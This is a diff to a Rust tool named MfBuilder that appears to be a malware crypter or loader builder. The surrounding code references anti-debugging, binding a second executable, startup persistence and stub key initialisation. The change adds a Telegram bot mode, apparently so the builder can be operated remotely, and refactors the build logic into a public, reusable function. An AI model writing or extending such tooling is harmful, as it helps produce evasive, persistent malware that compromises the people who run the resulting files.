@@ -8,9 +8,10 @@ mod mf_runner;
 mod binary_arch;
 mod build_native;
 mod build_dotnet;
+mod telegram_bot;
 
 
-use std::{fs::{self, OpenOptions}, io::{BufRead, Write}, process::Command};
+use std::{env, fs::{self, OpenOptions}, io::{BufRead, Write}, process::Command};
 use binary_arch::BinaryArch;
 use builders::{batch::BatchBuilder, exe::ExeBuilder};
 use colored::{Color, ColoredString, Colorize};
@@ -18,8 +19,8 @@ use dir_utils::remove_dir_all;
 use rand::{rngs::OsRng, Rng, RngCore};
 use serde_json::Value;
 
-#[derive(PartialEq)]
-enum SupportedFileExtension {
+#[derive(PartialEq, Clone, Debug)]
+pub enum SupportedFileExtension {
     BAT,
     EXE,
     UNKNOWN
@@ -42,7 +43,7 @@ impl SupportedFileExtension {
     }
 }
 
-struct MfBuilder {
+pub struct MfBuilder {
     build_arch: BinaryArch,
 
     anti_debug: bool,
@@ -62,7 +63,21 @@ fn h() -> ColoredString {
     return "[+] ".color(Color::White);
 }
 
-fn main() {
+#[tokio::main]
+async fn main() {
+    let args: Vec<String> = env::args().collect();
+    
+    // Check if bot mode is requested
+    if args.len() > 1 && args[1] == "--bot" {
+        telegram_bot::run_telegram_bot().await;
+        return;
+    }
+    
+    // Continue with CLI mode
+    run_cli_mode();
+}
+
+fn run_cli_mode() {
     let _ = colored::control::set_virtual_terminal(true);
     println!("{}{}", h(), "MfBuilder (Standard - 1.0.0)".color(Color::BrightGreen));
 
@@ -101,13 +116,16 @@ fn main() {
         build_config.binder_file_bytes = fs::read("bind.exe").unwrap();
     }
 
+    build_with_config(build_config);
+}
+
+pub fn build_with_config(mut build_config: MfBuilder) {
     let mut st = mf_runner::MfStubCS::new();
     st.init_keys();
     if build_config.run_on_startup {
         st.init_persistance();
     }
 
-    drop(payload_bytes);
     let input_url = if build_config.build_arch == BinaryArch::X64 || build_config.build_arch == BinaryArch::X86 {
         build_native::build_native_stage(&mut build_config, &mut st)
     } else {
